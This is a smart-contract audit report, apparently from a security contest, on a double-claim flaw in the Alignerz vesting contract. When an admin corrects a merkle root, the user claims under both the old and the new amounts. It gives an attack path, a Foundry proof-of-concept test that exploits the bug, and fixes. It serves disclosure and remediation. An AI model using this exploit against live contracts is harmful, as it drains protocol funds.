# [000334] Users can double-claim allocations when merkle roots are updated with different amounts
  
  ### Summary

The `claimedNFT` mapping uses the allocation amount in the leaf hash, allowing users to claim twice when admin updates merkle roots with different amounts, as different amounts create different leaf hashes that bypass the double-claim protection.

### Root Cause

In [AlignerzVesting.sol:871](https://github.com/dualguard/2025-11-alignerz/blob/main/protocol/src/contracts/vesting/AlignerzVesting.sol#L871) the leaf hash includes the amount: `keccak256(abi.encodePacked(msg.sender, amount, projectId, poolId))`. When admin updates merkle roots via `updateProjectAllocations()` with different amounts, users can claim with both the old and new roots because the leaf hashes differ.

The `claimedNFT` mapping in [AlignerzVesting.sol:876](https://github.com/dualguard/2025-11-alignerz/blob/main/protocol/src/contracts/vesting/AlignerzVesting.sol#L876) only prevents claiming the same leaf twice, not claiming different leaves for the same user.

### Internal Pre-conditions

1. Admin must call `finalizeBids()` with initial merkle root containing user allocation
2. User must claim NFT with initial allocation amount
3. Admin must call `updateProjectAllocations()` with new merkle root containing different allocation amount for the same user
4. User must not have claimed with the new root yet

### External Pre-conditions

None

### Attack Path


1. Admin finalizes bids with root A: user allocated 1000 tokens
2. User frontruns or claims with root A: `claimedNFT[hash(user, 1000, proj, pool)] = true`
3. Admin discovers error and calls `updateProjectAllocations()` with root B: user allocated 500 tokens (legitimate correction)
4. User claims again with root B: `claimedNFT[hash(user, 500, proj, pool)] = false` (different hash)
5. User receives second NFT with 500 tokens
6. User now has 1500 tokens total instead of intended 500

### Impact

Users can claim more tokens than intended when merkle roots are updated with different amounts. In the example scenario, a user claiming 1000 tokens with the initial root and then 500 tokens with the updated root results in 1500 tokens total instead of the corrected 500. The protocol loses funds equal to the difference between allocations.

### PoC


Run the coded POC:
```bash
forge test --match-path "test/MerkleRootDoubleClaim.t.sol" -vv
```

The test demonstrates:
- User claims with initial root (1000 tokens)
- Admin updates root with corrected amount (500 tokens)
- User claims again with new root (different leaf hash)
- User receives both allocations totaling 1500 tokens

Screenshot of the execution:

<img width="631" height="580" alt="Image" src="https://github.com/user-attachments/assets/32d68c1d-c303-4e93-b25b-7466b5bba60e" />

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import {Test, console} from "forge-std/Test.sol";
import {AlignerzVesting} from "../src/contracts/vesting/AlignerzVesting.sol";
import {AlignerzNFT} from "../src/contracts/nft/AlignerzNFT.sol";
import {MockUSD} from "../src/MockUSD.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Upgrades} from "openzeppelin-foundry-upgrades/Upgrades.sol";
import {Merkle} from "murky/src/Merkle.sol";

/**
 * @title MerkleRootDoubleClaim
 * @notice POC demonstrating double-claim via merkle root update with amount change
 * 
 * EXPLOIT SCENARIO:
 * 1. Admin finalizes with root A: user allocated 1000 tokens
 * 2. User claims NFT with root A → claimedNFT[hash(user, 1000, proj, pool)] = true
 * 3. Admin discovers error, updates to root B: user allocated 500 tokens (legitimate correction)
 * 4. User can claim AGAIN with root B → claimedNFT[hash(user, 500, proj, pool)] = false (different hash!)
 * 
 * ROOT CAUSE:
 * Leaf hash = keccak256(user, amount, projectId, poolId)
 * Different amounts = different hashes = no double-claim protection
 */
contract MerkleRootDoubleClaim is Test {
    AlignerzVesting public vesting;
    AlignerzNFT public nft;
    MockUSD public stablecoin;
    SimpleERC20 public projectToken;
    Merkle public merkle;
    
    address public admin = address(0x1);
    address public user = address(0x2);
    address public treasury = address(0x3);
    
    uint256 public projectId;
    uint256 public poolId = 0;
    
    function setUp() public {
        merkle = new Merkle();
        
        // Deploy contracts
        nft = new AlignerzNFT("AlignerzNFT", "AZNFT", "https://nft.alignerz.bid/");
        stablecoin = new MockUSD();
        projectToken = new SimpleERC20("ProjectToken", "PROJ");
        
        address payable proxy = payable(Upgrades.deployUUPSProxy(
            "AlignerzVesting.sol",
            abi.encodeCall(AlignerzVesting.initialize, (address(nft)))
        ));
        vesting = AlignerzVesting(proxy);
        
        // Fund user
        stablecoin.mint(user, 100_000 * 1e6);
        
        // Transfer ownership to admin
        vesting.transferOwnership(admin);
        nft.transferOwnership(admin);
        stablecoin.transferOwnership(admin);
        
        vm.startPrank(admin);
        vesting.setTreasury(treasury);
        nft.addMinter(address(vesting));
        
        // Launch project
        uint256 startTime = block.timestamp + 1 days;
        uint256 endTime = startTime + 7 days;
        bytes32 endTimeHash = keccak256(abi.encodePacked(endTime));
        
        vesting.launchBiddingProject(
            address(projectToken),
            address(stablecoin),
            startTime,
            endTime,
            endTimeHash,
            false
        );
        
        projectId = 0;
        
        // Create pool
        uint256 totalAllocation = 1_000_000 * 1e18;
        projectToken.mint(admin, totalAllocation);
        projectToken.approve(address(vesting), totalAllocation);
        vesting.createPool(projectId, totalAllocation, 100_000, false);
        
        vm.stopPrank();
    }
    
    function test_MerkleRootUpdateAllowsDoubleClaim() public {
        // Move to bidding period
        vm.warp(block.timestamp + 1 days + 1);
        
        // Step 1: User places bid
        vm.startPrank(user);
        stablecoin.approve(address(vesting), 10_000 * 1e6);
        vesting.placeBid(projectId, 10_000 * 1e6, 30 days);
        vm.stopPrank();
        
        // Move to after bidding period
        vm.warp(block.timestamp + 7 days);
        
        vm.startPrank(admin);
        
        // Step 2: Admin finalizes with ROOT A - user gets 1000 tokens (WRONG allocation)
        uint256 wrongAllocation = 1000 * 1e18;
        bytes32[] memory leavesA = new bytes32[](2);
        leavesA[0] = keccak256(abi.encodePacked(user, wrongAllocation, projectId, poolId));
        leavesA[1] = keccak256(abi.encodePacked(address(0x999), uint256(0), projectId, poolId)); // Dummy leaf
        bytes32 rootA = merkle.getRoot(leavesA);
        
        bytes32[] memory merkleRootsA = new bytes32[](1);
        merkleRootsA[0] = rootA;
        
        vesting.finalizeBids(projectId, bytes32(0), merkleRootsA, 30 days);
        
        vm.stopPrank();
        
        console.log("=== STEP 1: User claims with ROOT A (wrong allocation) ===");
        console.log("Allocation in root A:", wrongAllocation);
        
        // Step 3: User claims NFT with root A
        vm.startPrank(user);
        bytes32[] memory proofA = merkle.getProof(leavesA, 0);
        uint256 nftIdA = vesting.claimNFT(projectId, poolId, wrongAllocation, proofA);
        
        console.log("NFT claimed", nftIdA);
        console.log("claimedNFT[hash(user, 1000, proj, pool)] = true");
        
        // Verify claimed
        bytes32 leafA = keccak256(abi.encodePacked(user, wrongAllocation, projectId, poolId));
        assertTrue(vesting.claimedNFT(leafA), "Leaf A should be marked as claimed");
        
        vm.stopPrank();
        
        // Step 4: Admin discovers error and updates to ROOT B - user gets 500 tokens (CORRECT allocation)
        vm.startPrank(admin);
        
        uint256 correctAllocation = 500 * 1e18; // Legitimate correction
        bytes32[] memory leavesB = new bytes32[](2);
        leavesB[0] = keccak256(abi.encodePacked(user, correctAllocation, projectId, poolId));
        leavesB[1] = keccak256(abi.encodePacked(address(0x999), uint256(0), projectId, poolId)); // Dummy leaf
        bytes32 rootB = merkle.getRoot(leavesB);
        
        bytes32[] memory merkleRootsB = new bytes32[](1);
        merkleRootsB[0] = rootB;
        
        console.log("\n=== STEP 2: Admin updates to ROOT B (correct allocation) ===");
        console.log("Allocation in root B", correctAllocation);
        console.log("Admin legitimately corrects the allocation");
        
        vesting.updateProjectAllocations(projectId, bytes32(0), merkleRootsB);
        
        vm.stopPrank();
        
        // Step 5: User can claim AGAIN with root B (DIFFERENT LEAF HASH!)
        vm.startPrank(user);
        
        bytes32[] memory proofB = merkle.getProof(leavesB, 0);
        
        console.log("\n=== STEP 3: User claims AGAIN with ROOT B ===");
        console.log("Leaf A hash (1000 tokens):");
        console.logBytes32(leafA);
        bytes32 leafB = keccak256(abi.encodePacked(user, correctAllocation, projectId, poolId));
        console.log("Leaf B hash (500 tokens):");
        console.logBytes32(leafB);
        console.log("Different amounts = Different hashes = NO PROTECTION!");
        
        // This should NOT work but does!
        uint256 nftIdB = vesting.claimNFT(projectId, poolId, correctAllocation, proofB);
        
        console.log("Second NFT claimed", nftIdB);
        console.log("claimedNFT[hash(user, 500, proj, pool)] = false (different hash!)");
        
        // Verify both are claimed
        assertTrue(vesting.claimedNFT(leafA), "Leaf A still marked as claimed");
        assertTrue(vesting.claimedNFT(leafB), "Leaf B also marked as claimed");
        
        // User now has TWO NFTs with different allocations
        console.log("\n=== EXPLOIT SUCCESSFUL ===");
        console.log("User claimed TWICE:");
        console.log("First claim (wrong)", wrongAllocation);
        console.log("Second claim (correct)", correctAllocation);
        console.log("Total claimed", wrongAllocation + correctAllocation);
        console.log("User got MORE than intended!");
        
        vm.stopPrank();
        
        // Assertions
        assertNotEq(nftIdA, nftIdB, "User got two different NFTs");
        assertTrue(vesting.claimedNFT(leafA), "First claim registered");
        assertTrue(vesting.claimedNFT(leafB), "Second claim registered");
    }
    
    function test_FrontrunScenario() public {
        // Move to bidding period
        vm.warp(block.timestamp + 1 days + 1);
        
        // Same setup
        vm.startPrank(user);
        stablecoin.approve(address(vesting), 10_000 * 1e6);
        vesting.placeBid(projectId, 10_000 * 1e6, 30 days);
        vm.stopPrank();
        
        // Move to after bidding period
        vm.warp(block.timestamp + 7 days);
        
        vm.startPrank(admin);
        uint256 wrongAllocation = 1000 * 1e18;
        bytes32[] memory leavesA = new bytes32[](2);
        leavesA[0] = keccak256(abi.encodePacked(user, wrongAllocation, projectId, poolId));
        leavesA[1] = keccak256(abi.encodePacked(address(0x999), uint256(0), projectId, poolId)); // Dummy
        bytes32 rootA = merkle.getRoot(leavesA);
        bytes32[] memory merkleRootsA = new bytes32[](1);
        merkleRootsA[0] = rootA;
        vesting.finalizeBids(projectId, bytes32(0), merkleRootsA, 30 days);
        vm.stopPrank();
        
        // User sees admin is about to update root, frontruns the update
        vm.startPrank(user);
        bytes32[] memory proofA = merkle.getProof(leavesA, 0);
        uint256 nftIdA = vesting.claimNFT(projectId, poolId, wrongAllocation, proofA);
        vm.stopPrank();
        
        console.log("=== FRONTRUN SCENARIO ===");
        console.log("User frontruns admin's root update");
        console.log("Claimed with root A", wrongAllocation);
        
        // Admin updates root
        vm.startPrank(admin);
        uint256 correctAllocation = 500 * 1e18;
        bytes32[] memory leavesB = new bytes32[](2);
        leavesB[0] = keccak256(abi.encodePacked(user, correctAllocation, projectId, poolId));
        leavesB[1] = keccak256(abi.encodePacked(address(0x999), uint256(0), projectId, poolId)); // Dummy
        bytes32 rootB = merkle.getRoot(leavesB);
        bytes32[] memory merkleRootsB = new bytes32[](1);
        merkleRootsB[0] = rootB;
        vesting.updateProjectAllocations(projectId, bytes32(0), merkleRootsB);
        vm.stopPrank();
        
        // User claims again with new root
        vm.startPrank(user);
        bytes32[] memory proofB = merkle.getProof(leavesB, 0);
        uint256 nftIdB = vesting.claimNFT(projectId, poolId, correctAllocation, proofB);
        
        console.log("Claimed again with root B", correctAllocation);
        console.log("Total claimed", wrongAllocation + correctAllocation);
        console.log("User successfully double-claimed by frontrunning!");
        
        vm.stopPrank();
        
        assertNotEq(nftIdA, nftIdB, "Two different NFTs");
    }
}

contract SimpleERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
    
    function decimals() public pure override returns (uint8) {
        return 18;
    }
}


```

### Mitigation

Track claims per user and project rather than per leaf hash. Options:
1. Add a mapping `mapping(address => mapping(uint256 => bool)) public hasClaimedNFT` to track if user has claimed for a project
2. Prevent `updateProjectAllocations()` from being called after any claims have been made
3. Invalidate old merkle proofs when roots are updated by tracking root versions


  